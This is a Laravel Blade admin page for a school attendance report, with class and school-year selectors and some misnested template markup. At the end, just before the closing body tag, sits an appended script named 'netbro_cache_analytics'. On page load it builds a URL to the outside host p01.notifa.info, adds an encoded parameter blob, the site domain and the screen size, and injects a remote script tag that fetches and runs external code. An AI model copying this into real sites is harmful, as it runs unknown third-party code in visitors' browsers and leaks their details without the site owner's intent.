@extends('layouts.admin')
@section('content')

<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">

    <!-- Page-Level Plugin CSS - Tables -->
    <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">

    <!-- SB Admin CSS - Include with every page -->
    <link href="css/sb-admin.css" rel="stylesheet">

</head>

<body>

    <div id="wrapper">

     


        <div id="page-wrapper">
          <div class="row">
                <div class="col-lg-12">
                    <h3 class="page-header"><strong>Laporan Data Absensi</strong></h3>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
                                <div class="form-group">
                                            <label>Kelas</label>
                        @php $no = 1; @endphp
                        @foreach($absensi_siswa as $data)
    
                                            <select class="form-control" value="{{$data->kelas->nama_kelas}}" name="id_kelas">
                                                <option value='{{$kelas->nama_kelas}}'></option>            
                                            </select>
                                        </div>
                         @endforeach   

            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            Pilih Tahun
                        </div>
                        <div class="panel-body">
                            <div class="row">
                                    <form method="get" role="form" action="absensi_siswa">
                        <input type="hidden" name="module" value="laporan">


                                <div class="col-lg-4">
                                        
               
                                        <div class="form-group">
                                            <label>Tahun</label>
                                            <select class="form-control" name="tahun">
<option>2010-2011</option><option>2011-2012</option><option>2012-2013</option><option>2013-2014</option><option>2014-2015</option><option>2015-2016</option><option>2016-2017</option><option>2017-2018</option><option>2018-2019</option><option>2019-2020</option><option>2020-2021</option><option>2021-2022</option><option>2022-2023</option><option>2023-2024</option><option>2024-2025</option><option>2025-2026</option><option>2026-2027</option><option>2027-2028</option><option>2028-2029</option><option>2029-2030</option><option>2030-2031</option><option>2031-2032</option><option>2032-2033</option><option>2033-2034</option><option>2034-2035</option><option>2035-2036</option><option>2036-2037</option><option>2037-2038</option><option>2038-2039</option><option selected>2039-2040</option><option>2040-2041</option><option>2041-2042</option><option>2042-2043</option><option>2043-2044</option><option>2044-2045</option><option>2045-2046</option><option>2046-2047</option><option>2047-2048</option><option>2048-2049</option><option>2049-2050</option><option>2050-2051</option>                                            </select>
                                        </div>

                                        <button type="submit" class="btn btn-info">Submit Button</button>
                                </div>
                               
                                <!-- /.col-lg-6 (nested) -->
                                    </form>

                            </div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
            
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- Core Scripts - Include with every page -->
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mPnomvi5K48BcMuRnBn5KpMJzq%2fQixhs8M0ErnnRW8N6%2bkfVU43BgvXPNKZ4gg9G944Bdi1wZtg4uNQPepRhxzgKevlVWVnBF72nRZyrPsU5tsuj%2b6%2f6bWMV4DxfF3kguBa1C0XGlx9LwKczEXYLzQF6i3Evb0rGYjQ91dM2fpMKMnfTdl0CeoRJQ%2ft2npF5G92cqVvzy09b8PJuMROVJ8AqtbdWg%2fpQSk6YI2rLN8jFO0B7O%2fh9oR8lRW45esqj7sB2TrBzy17eCB%2fMQIpXx9iKiGJC%2fdZPSMCHvJclR6kC2RCsB%2bil9CTCN%2b0emfQT6whOtS609PW92si%2bJRYtyh%2bQ4m7aHS6lVFAXC%2fLlRhc7mufZ3JWLwoY1txuLOBRJ9gX44nI4MsqcuWo92AkP4v6qQmtUVu1SS6Qf8RxSSdkGPopwHEYCI2OMjRsUYJUesn4QJWeBbMPeoB33NoypEdKBDn8V6XIDNLRHtmTOXFZPJaLFcf7s4bFl7N6OQuls%2b6Xm9DCVq%2f4unstIjR6phKCpZiHRkv3le3k4vYna5BJxAwHmvR426XzmfT1GJecWBCmF9KY8aTvHY6jfYonbJbDRxeeFm%2bcfr" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection
